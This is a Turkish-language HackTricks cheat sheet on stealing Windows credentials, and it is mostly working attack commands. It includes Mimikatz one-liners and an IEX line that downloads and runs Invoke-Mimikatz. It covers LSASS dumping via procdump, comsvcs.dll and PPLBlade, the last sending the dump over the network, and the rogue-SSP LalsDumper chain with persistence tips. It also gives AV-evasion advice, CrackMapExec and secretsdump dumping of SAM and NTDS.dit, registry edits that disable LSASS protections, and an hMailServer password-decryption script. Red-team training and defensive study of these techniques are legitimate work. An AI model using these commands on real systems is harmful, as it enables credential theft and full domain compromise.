# Windows Credentials Çalma

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz'in yapabileceği diğer şeyleri** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **Bu korumalar Mimikatz'ın bazı credentials'ları çıkarmasını engelleyebilir.**

## Meterpreter ile Credentials

Kurbanın içinde **passwords and hashes aramak için** benim oluşturduğum [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)'i kullanın.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

**Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**meşru bir Microsoft aracı olduğu için**, Defender tarafından tespit edilmiyor.\
Bu aracı **dump the lsass process**, **download the dump** ve **extract** **credentials locally** yapmak için kullanabilirsiniz.

Ayrıca [SharpDump](https://github.com/GhostPack/SharpDump) kullanabilirsiniz.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Bu işlem [SprayKatz](https://github.com/aas-n/spraykatz) ile otomatik olarak yapılır: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: Bazı **AV**'ler **procdump.exe to dump lsass.exe** kullanımını **malicious** olarak **detect** edebilir; bunun nedeni **"procdump.exe" and "lsass.exe"** dizelerini **detect** etmeleridir. Bu yüzden **lsass.exe** adını vermek yerine **procdump**'a **lsass.exe**'nin **PID**'ini bir **argument** olarak **pass** etmek daha **stealthier** olur.

### lsass'i **comsvcs.dll** ile dökme

`C:\Windows\System32` içinde bulunan **comsvcs.dll** adlı bir DLL, bir çökme durumunda **process memory**'nin dökümünü almakla sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılmak üzere tasarlanmış **`MiniDumpW`** adlı bir **function** içerir.  
İlk iki argümanın kullanılması önemsizdir, ancak üçüncü argüman üç bileşene ayrılmıştır. Dökülecek işlem kimliği (PID) ilk bileşeni oluşturur, dump dosyasının konumu ikinci bileşeni temsil eder ve üçüncü bileşen kesinlikle **full** kelimesidir. Başka bir seçenek yoktur.  
Bu üç bileşen ayrıştırıldıktan sonra, DLL dump dosyasını oluşturur ve belirtilen işlemin belleğini bu dosyaya aktarır.  
**comsvcs.dll** kullanımı lsass işlemini dump etmek için uygundur ve böylece procdump yükleyip çalıştırma ihtiyacını ortadan kaldırır. Bu yöntem ayrıntılı olarak şu adreste açıklanmıştır: [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Yürütme için aşağıdaki komut kullanılır:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Bu işlemi [**lssasy**](https://github.com/Hackndo/lsassy) ile otomatikleştirebilirsiniz.**

### **lsass'i Görev Yöneticisi ile dump alma**

1. Görev Çubuğuna sağ tıklayın ve Görev Yöneticisi'ne tıklayın  
2. Daha fazla ayrıntıya tıklayın  
3. İşlemler sekmesinde "Local Security Authority Process" işlemini arayın  
4. "Local Security Authority Process" işlemine sağ tıklayın ve "Create dump file" seçeneğine tıklayın

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) Microsoft tarafından imzalanmış bir ikili dosyadır ve [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçasıdır.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade ile lsass dökümü

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) Protected Process Dumper Tool'dur; memory dump'ları obfuskasyonla gizlemeyi ve bunları diske bırakmadan uzak iş istasyonlarına aktarmayı destekler.

**Key functionalities**:

1. PPL korumasını atlatma
2. Obfuscating memory dump files ile Defender'ın signature-based detection mekanizmalarından kaçınma
3. RAW ve SMB upload yöntemleriyle memory dump'ı diske bırakmadan yükleme (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon, `MiniDumpWriteDump` çağırmayan ve bu yüzden o API'ye takılı EDR hooklarının tetiklenmediği üç aşamalı bir dumper olan **LalsDumper**'ı sunar:

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` içinde 32 adet küçük `d` karakterinden oluşan bir placeholder arar, bunu `rtu.txt`'nin mutlak yolu ile üzer yazar, yamalanmış DLL'i `nfdp.dll` olarak kaydeder ve `AddSecurityPackageA("nfdp","fdp")` çağrısını yapar. Bu, **LSASS**'ın kötü amaçlı DLL'i yeni bir Security Support Provider (SSP) olarak yüklemesini zorlar.
2. **Stage 2 inside LSASS** – LSASS `nfdp.dll`'yi yüklediğinde, DLL `rtu.txt`'i okur, her baytı `0x20` ile XOR'lar ve yürütmeyi devretmeden önce çözülen blob'u belleğe mapler.
3. **Stage 3 dumper** – maplenmiş payload, hash'lenmiş API isimlerinden çözülen **direct syscalls** kullanarak MiniDump mantığını yeniden uygular (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). `Tom` adlı özel bir export `%TEMP%\<pid>.ddt` dosyasını açar, sıkıştırılmış bir LSASS dökümünü dosyaya stream'ler ve daha sonra exfiltration yapılabilmesi için handle'ı kapatır.

Operator notes:

* `lals.exe`, `fdp.dll`, `nfdp.dll` ve `rtu.txt`'yi aynı dizinde tutun. Stage 1, sabit kodlu placeholder'ı `rtu.txt`'nin mutlak yolu ile yeniden yazar, bu yüzden bunları ayırmak zinciri kırar.
* Kayıt, `nfdp`'yi `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`'a ekleyerek yapılır. Bu değeri kendiniz ayarlayarak LSASS'ın her önyüklemede SSP'yi yeniden yüklemesini sağlayabilirsiniz.
* `%TEMP%\*.ddt` dosyaları sıkıştırılmış dökümlerdir. Yerel olarak açın, sonra kimlik bilgisi çıkarımı için bunları Mimikatz/Volatility'ye verin.
* `lals.exe`'yi çalıştırmak için admin/SeTcb hakları gerekir ki `AddSecurityPackageA` başarılı olsun; çağrı döndüğünde LSASS rogue SSP'yi şeffaf biçimde yükler ve Stage 2'yi çalıştırır.
* DLL'i diskten silmek, LSASS'ten atmaz. Ya kayıt girdisini silip LSASS'ı yeniden başlatın (reboot) ya da uzun vadeli persistence için olduğu gibi bırakın.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Hedef DC'den NTDS.dit'i Dump et
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump hedef DC'den NTDS.dit parola geçmişini
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Her NTDS.dit hesabı için pwdLastSet özniteliğini göster
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Bu dosyalar _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM._ konumunda olmalıdır. Ancak **onları normal bir şekilde kopyalayamazsınız** çünkü korumalıdırlar.

### From Registry

Bu dosyaları ele geçirmenin en kolay yolu registry'den bir kopyasını almaktır:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**İndirin** bu dosyaları Kali makinenize ve **hashes'i çıkarın** kullanarak:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Bu hizmeti kullanarak korumalı dosyaların kopyasını alabilirsiniz. Administrator olmanız gerekir.

#### vssadmin Kullanımı

vssadmin binary yalnızca Windows Server sürümlerinde mevcuttur
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ama aynı şeyi **Powershell** ile de yapabilirsiniz. Bu, **SAM file'ı nasıl kopyalayacağınız** örneğidir (kullanılan sabit sürücü "C:" ve kaydedildiği yer C:\users\Public) ancak bunu herhangi bir korumalı dosyayı kopyalamak için kullanabilirsiniz:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kitaptan alınan kod: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Son olarak, [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kullanarak SAM, SYSTEM ve ntds.dit dosyalarının bir kopyasını alabilirsiniz.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Kimlik Bilgileri - NTDS.dit**

**NTDS.dit** dosyası, kullanıcı nesneleri, gruplar ve üyelikleri hakkında kritik verileri tutan **Active Directory**'nin kalbi olarak bilinir. Etki alanı kullanıcılarının **parola hashleri** burada saklanır. Bu dosya bir **Extensible Storage Engine (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.

Bu veritabanı içinde üç ana tablo tutulur:

- **Data Table**: Kullanıcılar ve gruplar gibi nesnelerle ilgili detayları saklamakla görevlidir.
- **Link Table**: Grup üyelikleri gibi ilişkileri takip eder.
- **SD Table**: Her nesne için **security descriptors** burada tutulur; saklanan nesneler için güvenlik ve erişim kontrolünü sağlar.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows bu dosyayla etkileşim için _Ntdsa.dll_'yi kullanır ve bu, _lsass.exe_ tarafından kullanılır. Bu nedenle **NTDS.dit** dosyasının bir **bölümü** **`lsass`** belleğinde bulunabilir (muhtemelen performans için kullanılan bir **cache** nedeniyle en son erişilen verileri bulabilirsiniz).

#### NTDS.dit içindeki hash'lerin çözülmesi

Hash 3 katmanlı olarak şifrelenmiştir:

1. Parola Şifreleme Anahtarını (**PEK**) **BOOTKEY** ve **RC4** kullanarak çözün.
2. **PEK** ve **RC4** kullanarak **hash**'i çözün.
3. **DES** kullanarak **hash**'i çözün.

**PEK**, **her etki alanı denetleyicisinde** aynı değere sahiptir, ancak etki alanı denetleyicileri arasında farklı olan etki alanı denetleyicisinin **SYSTEM** dosyasının **BOOTKEY**'i kullanılarak **NTDS.dit** dosyası içinde **şifrelenmiştir**. Bu nedenle NTDS.dit dosyasından kimlik bilgilerini almak için **NTDS.dit ve SYSTEM** dosyalarına ihtiyacınız vardır (_C:\Windows\System32\config\SYSTEM_).

### Ntdsutil kullanarak NTDS.dit kopyalama

Windows Server 2008'den beri kullanılabilir.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Ayrıca [**volume shadow copy**](#stealing-sam-and-system) yöntemini kullanarak **ntds.dit** dosyasını kopyalayabilirsiniz. Unutmayın ki **SYSTEM dosyasının** bir kopyasına da ihtiyacınız olacak (yeniden, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) yöntemini kullanın).

### **NTDS.dit'ten hashes çıkarma**

**NTDS.dit** ve **SYSTEM** dosyalarını **elde ettiğinizde**, _secretsdump.py_ gibi araçları **hashes'i çıkarmak** için kullanabilirsiniz:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ayrıca geçerli bir domain admin user kullanarak bunları **otomatik olarak çıkarabilirsiniz**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Büyük **NTDS.dit** dosyaları için, bunları çıkarmak üzere [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanılması önerilir.

Son olarak, **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ veya **mimikatz** `lsadump::lsa /inject`'i de kullanabilirsiniz.

### **NTDS.dit içindeki domain nesnelerini SQLite veritabanına çıkarma**

NTDS nesneleri [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkarılabilir. Sadece secrets değil; ham NTDS.dit dosyası zaten elde edildiğinde daha fazla bilgi çıkarımı için tüm nesneler ve özellikleri de çıkarılır.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive isteğe bağlıdır ancak gizli verilerin şifresini çözmeyi sağlar (NT & LM hash'leri, cleartext passwords gibi ek kimlik bilgileri, kerberos veya trust anahtarları, NT & LM parola geçmişleri). Diğer bilgilerle birlikte şu veriler çıkarılır: hash'leriyle kullanıcı ve makine hesapları, UAC bayrakları, son oturum açma ve parola değişikliği zaman damgası, hesap açıklamaları, adlar, UPN, SPN, gruplar ve özyinelemeli üyelikler, organizational units ağacı ve üyeliği, trusted domains ile trust türü, yönü ve öznitelikleri...

## Lazagne

Binary'yi [here](https://github.com/AlessandroZ/LaZagne/releases) adresinden indirin. Bu binary'yi çeşitli yazılımlardan kimlik bilgilerini çıkarmak için kullanabilirsiniz.
```
lazagne.exe all
```
## SAM ve LSASS'tan kimlik bilgilerini çıkarmak için diğer araçlar

### Windows credentials Editor (WCE)

Bu araç hafızadan kimlik bilgilerini çıkarmak için kullanılabilir. İndirmek için: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM dosyasından kimlik bilgilerini çıkarır
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM dosyasından kimlik bilgilerini çıkar
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Buradan indirin:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) ve sadece **çalıştırın**; parolalar çıkarılacaktır.

## Boşta kalan RDP oturumlarını keşfetme ve güvenlik kontrollerini zayıflatma

Ink Dragon’ın FinalDraft RAT'i, herhangi bir red-teamer için kullanışlı olan `DumpRDPHistory` tasker'ını içerir:

### DumpRDPHistory tarzı telemetri toplama

* **Giden RDP hedefleri** – her kullanıcı hive'ini `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` konumunda ayrıştırın. Her alt anahtar sunucu adını, `UsernameHint`'i ve son yazma zaman damgasını saklar. FinalDraft’in mantığını PowerShell ile çoğaltabilirsiniz:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Gelen RDP kanıtı** – kimin makineyi yönettiğini haritalamak için `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` günlüğünü Event ID'leri **21** (başarılı oturum açma) ve **25** (bağlantı kesilme) için sorgulayın:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Hangi Domain Admin'in düzenli olarak bağlandığını öğrendikten sonra, onların **bağlantısı kesik** oturumu hâlâ varken LSASS'i (LalsDumper/Mimikatz ile) dökün. CredSSP + NTLM fallback, doğrulayıcılarını ve token'larını LSASS içinde bırakır; bunlar daha sonra SMB/WinRM üzerinden yeniden oynatılarak `NTDS.dit` alınabilir veya domain controller'larda persistans oluşturulabilir.

### FinalDraft tarafından hedeflenen Registry düşürmeleri

Aynı implant, kimlik bilgisi hırsızlığını kolaylaştırmak için birkaç registry anahtarını da değiştirir:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` ayarı RDP sırasında kimlik bilgisi/biletlerin tam yeniden kullanımını zorlar, pass-the-hash tarzı pivotları mümkün kılar.
* `LocalAccountTokenFilterPolicy=1` UAC token filtrelemesini devre dışı bırakır, böylece yerel yöneticiler ağ üzerinden sınırsız token alır.
* `DSRMAdminLogonBehavior=2` DSRM yöneticisinin DC çevrimiçi iken oturum açmasına izin verir, saldırganlara başka bir yerleşik yüksek ayrıcalıklı hesap sağlar.
* `RunAsPPL=0` LSASS PPL korumalarını kaldırır, LalsDumper gibi dumper'lar için belleğe erişimi basit hale getirir.

## hMailServer veritabanı kimlik bilgileri (post-compromise)

hMailServer DB parolasını `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` dosyasında `[Database] Password=` altında saklar. Değer, sabit anahtar `THIS_KEY_IS_NOT_SECRET` ile Blowfish ile şifrelenmiş ve 4-byte kelime endianness swap'larına tabi tutulmuştur. INI'den alınan hex string'i şu Python snippet'i ile kullanın:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Açık metin parola ile, dosya kilitlerinden kaçınmak için SQL CE veritabanını kopyalayın, 32-bit provider'ı yükleyin ve hashes'i sorgulamadan önce gerekiyorsa yükseltin:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` sütunu hMailServer hash formatını kullanır (hashcat modu `1421`). Bu değerlerin kırılması, WinRM/SSH pivotları için yeniden kullanılabilir kimlik bilgileri sağlayabilir.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Bazı toolingler, LSA logon callback'i `LsaApLogonUserEx2`'yi intercept ederek **plaintext logon passwords** yakalar. Amaç, authentication package callback'i hook veya wrap etmek, böylece kimlik bilgileri **during logon** (hashlenmeden önce) yakalanıp diske yazılmak veya operatöre dönülmektir. Bu genellikle LSA'ya inject eden veya LSA ile register olan bir helper olarak uygulanır ve ardından her başarılı interactive/network logon olayını username, domain ve password ile kaydeder.

Operational notes:
- Kimlik doğrulama yoluna helper'ı yüklemek için local admin/SYSTEM gerekir.
- Yakalanan kimlik bilgileri yalnızca bir logon gerçekleştiğinde görünür (hook'a bağlı olarak interactive, RDP, service veya network logon).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) kaydedilmiş connection bilgilerini kullanıcı başına bir `sqlstudio.bin` dosyasında saklar. Dedicated dumpers bu dosyayı parse edip kaydedilmiş SQL credentials'ları kurtarabilir. Sadece komut çıktısı döndüren shell'lerde, dosya genellikle Base64 ile encode edilip stdout'a yazdırılarak exfiltrated edilir.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Operatör tarafında, dosyayı yeniden oluşturun ve kimlik bilgilerini kurtarmak için dumper'ı yerel olarak çalıştırın:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Referanslar

- [Unit 42 – Yüksek Değerli Sektörleri Hedefleyen, Yıllar Boyunca Tespit Edilemeyen Operasyonların İncelenmesi](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Gizli Bir Saldırı Operasyonunun Aktarma Ağı ve İç İşleyişini Ortaya Çıkarma](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
